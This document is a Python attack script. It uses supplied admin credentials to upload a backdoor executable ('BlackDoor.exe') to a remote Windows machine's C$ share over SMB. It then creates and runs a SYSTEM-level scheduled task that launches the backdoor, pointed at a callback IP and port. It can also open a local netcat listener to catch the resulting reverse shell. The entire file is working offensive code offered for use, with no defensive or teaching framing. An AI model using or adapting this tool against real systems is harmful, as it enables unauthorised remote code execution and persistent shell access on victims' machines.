import smbclient
import subprocess
import datetime
import argparse
import socket
import threading
import os 
import random

def netcat_thread(port):

    command = "start cmd /k .\\nc.exe -nlvp " + str(port)
    subprocess.Popen(command, shell=True)
    print("[+] Listening on port: " + str(port))


def run_command(command):
    subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)



def main(ip=None,username=None,password=None, local=False, remote=False):

    port = 1997
    smb_share_path = 'C$'
    task_name = "MyTask"
    executable = "C:\\BlackDoor.exe"
    start_time = (datetime.datetime.now() + datetime.timedelta(seconds=60)).strftime("%H:%M:%S")
    local_file_path = '.\\BlackDoor.exe'
    remote_file_path = f'\\\\{ip}\\{smb_share_path}\\BlackDoor.exe'

    # Set the login credentials for the SMB server
    smbclient.ClientConfig(username=username, password=password)
    print("[+] SMB connected successfully.")
    # Local file path and remote destination path


    print(f"[*] Uploading payload to SMB share...")

    # Upload the local file to the SMB 
    with open(local_file_path, 'rb') as local_file:
        with smbclient.open_file(remote_file_path, mode='wb') as remote_file:
            remote_file.write(local_file.read())

    print(f"[+] Payload uploaded to SMB share successfully")
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname)   

    if local:
        while True:
            port = random.randint(1024, 65535)
            try:
                netcat_thread(port)
                break
            except:
                pass
    if remote:
        IPAddr = remote
        port= 2001


    # Create the command to schedule the task
    command = f'schtasks /Create /S {ip} /U {username} /P {password} /RU SYSTEM /SC ONCE /TN {task_name} /TR "{executable} {IPAddr} {port}" /ST {start_time} /F'
    commandRun = f'schtasks /Run /S {ip} /U {username} /P {password} /TN {task_name}'
    # Execute the command
    print(f"[*] Connecting to listener...")
    subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    thread = threading.Thread(target=run_command, args=(commandRun,))
    thread.start()
    print(f"[+] Connected.")




if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Connect to clients.")
    parser.add_argument("-u", "--username", help="Admin username.", type=str)
    parser.add_argument("-p", "--password", help="Admin password.", type=str)
    parser.add_argument("-ip", "--ip_addr", help="IP address of remote machine.")
    parser.add_argument("-local", "--local_ip", help="Create connection to this machine.", action='store_true')
    parser.add_argument("-remote", "--remote_ip", help="Send connection to remote machine (default port: 2001).", type=str)
    args = parser.parse_args()

    main(ip=args.ip_addr, username=args.username,password=args.password, local=args.local_ip, remote=args.remote_ip)
